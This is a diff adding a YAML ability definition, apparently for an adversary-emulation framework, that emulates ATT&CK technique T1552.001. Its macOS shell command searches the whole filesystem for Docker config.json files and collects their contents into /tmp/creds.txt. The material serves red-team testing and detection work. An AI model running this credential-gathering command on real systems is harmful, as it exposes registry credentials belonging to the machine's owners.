@@ -1,0 +1,42 @@
+- id: 5a668739-3a2f-4265-895f-c0e1e0b09eaa
+  name: Find Docker credentials
+  description: Find local Docker credentials from file, defaults to using / as the
+    look path.
+  tactic: credential-access
+  technique:
+    attack_id: T1552.001
+    name: 'Unsecured Credentials: Credentials In Files'
+  platforms:
+    darwin:
+      sh:
+        command: find / -path '*/.docker/config.json' -type f -exec sh -c 'echo "===
+          $1 ===" >> /tmp/creds.txt; cat "$1" >> /tmp/creds.txt' _ {} \; 2>/dev/null
+        cleanup: rm -f /tmp/creds.txt
+  plugin: atomic
+  singleton: false
+  repeatable: true
+  delete_payload: false
+  privilege: ''
+  buckets:
+  - atomic-red-team
+  - t1552.001
+  - credential-access
+  author: Atomic Red Team
+  additional_info:
+    input_arguments:
+      file_path:
+        description: Path to search
+        type: string
+        default: /
+      filename:
+        description: Credential file to search for
+        type: string
+        default: config.json
+      optional_flags:
+        description: optional flags passed into find that should be ran
+        type: string
+        default: -exec sh -c 'echo "=== $1 ===" >> /tmp/creds.txt; cat "$1" >> /tmp/creds.txt'
+          _ {} \;
+    technique_created: '2020-02-04T12:52:13.006Z'
+    atomic_guid: 5a668739-3a2f-4265-895f-c0e1e0b09eaa
+    import_timestamp: '2026-09-05T06:40:49.893160Z'
